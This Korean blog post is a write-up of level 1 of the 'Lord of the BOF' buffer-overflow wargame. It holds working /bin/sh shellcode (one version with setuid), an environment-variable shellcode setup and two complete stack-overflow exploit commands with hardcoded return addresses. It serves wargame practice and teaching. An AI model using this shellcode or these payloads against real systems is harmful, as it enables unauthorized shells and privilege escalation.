---
layout: post
title: "The Lord of the BOF - Level 1"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level1/1.jpg" | relative_url }}' alt='relative'>  

## 1) gate/gate 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level1/2.png" | relative_url }}' alt='relative'>  

코드 내용을 보니 argv가 2보다 작은지 조건 검사를 하기 때문에 프로그램 실행 시 인자를 넣어줘야 합니다.  
argv[1]에 입력한 내용을 buffer 배열에 입력하는 데 strcpy 함수를 사용하여 취약점이 생겼습니다.  
입력받는 문자열 길이에 제한을 두지 않아 buffer 배열의 길이인 256 바이트 이상의 문자열을 입력할 수 있습니다.  

## 2) BOF 전처리 과정    

### (0) gremlin 스택 구조 확인하기  

<img data-action="zoom" src='{{ "assets/lob/level1/3.png" | relative_url }}' alt='relative'>  

``` bash
0x804845f <main+47>:    lea    %eax,[%ebp-256]
0x8048465 <main+53>:    push   %eax
0x8048466 <main+54>:    call   0x8048370 <strcpy>
```

위의 어셈블리어 코드를 보니 buffer 배열의 위치가 ebp 레지스터에서 256 바이트 떨어진 주소에 위치합니다.  
그러면 RET이 위치한 주소는 문자열 배열 시작 주소에서 256(buffer) byte + 4(SFP) byte에 위치합니다.  

### (1) Eggshell  

FTZ 문제를 풀었다면 이 문제는 쉽게 해결할 수 있습니다.  
- <a href="https://hsong2.github.io/ftz/2021/05/24/Hacker-School-FTZ-Shellcode.html">쉘코드 만드는 방법</a>  
- <a href="https://hsong2.github.io/ftz/2021/05/31/Hacker-School-FTZ-Level-12.html#env">환경변수에 쉘코드 저장</a>  

위의 내용을 참고하여 쉘코드를 환경변수에 저장하였습니다.  

``` c
// Shellcode (setuid 포함, 39 byte)
\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80

// Shellcode (setuid 미포함, 25 byte)
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```

``` bash
export EGG=`python -c 'print "\x90"*20+"\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` bash
echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c
```

``` bash
gcc -o getenv getenv.c
```

``` bash
./getenv
```

<img data-action="zoom" src='{{ "assets/lob/level1/4.png" | relative_url }}' alt='relative'>  

RET 위치에 쉘코드가 저장된 환경변수의 주소를 넣어주면 됩니다.  

Eggshell 방식을 사용했을 때 공격 페이로드는 다음과 같습니다. (마지막 환경변수 주소는 본인에 맞게 수정하세요.)  

``` bash
./gremlin `python -c 'print "\x90"*260+"\xab\xfd\xff\xbf"'`
```

### (2) buffer 배열에 shellcode 입력  

buffer 배열에 쉘코드를 입력하고 RET에 buffer 배열의 주소를 입력하면 됩니다.  

우선 gdb로 프로그램을 실행해보기 위해 새로운 프로그램 하나를 만들었습니다.  

```bash
gcc -o test gremlin.c
```

0x8048466 <main+54> 이 주소에 break를 걸고 test 프로그램을 gdb로 실행하였습니다.  
그리고 break가 걸려있을 때 레지스터 정보를 확인하였습니다.  

``` bash
gdb -q ./test

set disassembly-flavor intel

b *main+54

r `python -c 'print "\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*31+"AAAA"'`

info registers
```

gdb로 test 프로그램을 2번 실행해봤는데 ebp 레지스터의 값은 두번 다 동일하였습니다.  
프로그램 실행할 때마다 스택 메모리 주소가 바뀌는 BOF 보호 기법이 적용되지 않았습니다.   

<img data-action="zoom" src='{{ "assets/lob/level1/5.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level1/6.png" | relative_url }}' alt='relative'>  

프로그램 실행 시마다 메모리에 프로세스가 배치될 위치가 랜덤으로 정해지는 ASLR(Address space layout randomization) 기법이 적용되지 않았습니다.  
스택 메모리 주소가 바뀌지 않는다면 buffer 배열의 주소는 ebp 레지스터에 저장된 주소 값에 256을 뺀 0xbffff928 입니다.  
0xbffffa28 - 0x100(=256) = 0xbffff928

<img data-action="zoom" src='{{ "assets/lob/level1/7.png" | relative_url }}' alt='relative'>  

buffer 배열에 shellcode를 입력하는 방식을 사용했을 때 공격 페이로드는 다음과 같습니다.  

``` bash
./gremlin `python -c 'print "\x90"*200+"\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*21+"\x28\xf9\xff\xbf"'`
```

## 3) BOF 시도  

### (1) Eggshell 방식 결과  

<img data-action="zoom" src='{{ "assets/lob/level1/8.png" | relative_url }}' alt='relative'>  

### (2) buffer 배열에 shellcode 입력 방식 결과  

<img data-action="zoom" src='{{ "assets/lob/level1/9.png" | relative_url }}' alt='relative'>  

## 4) 공격 페이로드를 정확히 입력했는데도 공격이 성공하지 않는 경우!!!  

bash2 쉘로 실행하면 수행됩니다.  

``` bash
bash2
```

<img data-action="zoom" src='{{ "assets/lob/level1/10.png" | relative_url }}' alt='relative'>  